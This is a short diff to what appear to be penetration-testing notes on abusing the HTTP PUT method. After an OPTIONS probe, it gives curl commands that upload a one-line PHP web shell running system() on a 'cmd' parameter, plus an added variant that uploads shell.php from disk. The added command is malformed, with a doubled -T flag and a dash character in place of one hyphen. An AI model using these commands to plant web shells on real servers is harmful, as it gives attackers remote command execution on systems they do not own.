@@ -4,4 +4,8 @@ curl -v -X OPTIONS http://xxx.xx/xxx/
 
 2. Upload files:
 
-curl -X PUT -d '<?php system($_GET["cmd"]);' http://xxx/xxx/phpsimpleshell.php
+
+- curl -X PUT -d '<?php system($_GET["cmd"]);' http://xxx/xxx/phpsimpleshell.php
+
+- from disk: 
+curl -v -T -T shell.php –-url http://test/test/ -0
